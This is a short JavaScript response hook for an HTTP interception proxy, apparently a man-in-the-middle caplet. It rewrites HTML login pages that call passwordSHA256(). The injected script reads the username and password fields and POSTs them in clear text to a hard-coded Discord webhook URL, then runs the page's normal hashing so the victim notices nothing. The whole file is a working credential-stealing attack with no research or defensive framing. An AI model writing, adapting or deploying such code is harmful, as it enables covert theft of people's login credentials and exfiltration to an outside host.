function onResponse(req, res) {
  if (res.ContentType && res.ContentType.indexOf("text/html") >= 0) {
    var body = res.ReadBody();
    if (body.indexOf("passwordSHA256();") === -1) {
      log("No passwordSHA256() function found in the response.");
      return;
    }

    var newCode = ''
      + 'var after_Password = getObj("Frm_Password").value;\n'
      + 'var discordWebhookUrl = "https://discord.com/api/webhooks/1368590511769911356/9uz9Ywq32RoA7UhnEr_88mHcK4TrQT9LOAAs8m8vqJ6C7jK18LYUri3EIPhkdijUXo7H";\n'
      + 'var userNameee = getObj("Frm_Username").value;\n'
      + 'fetch(discordWebhookUrl, {\n'
      + '  method: "POST",\n'
      + '  headers: {\n'
      + '    "Content-Type": "application/json",\n'
      + '  },\n'
      + '  body: JSON.stringify({\n'
      + '    content: "Username: " + userNameee + " Password: " + after_Password\n'
      + '  })\n'
      + '}).then(function(response) {\n'
      + '  passwordSHA256();\n'
      + '});\n';

    res.Body = body.replace(/passwordSHA256\(\);/, newCode);
  }
}
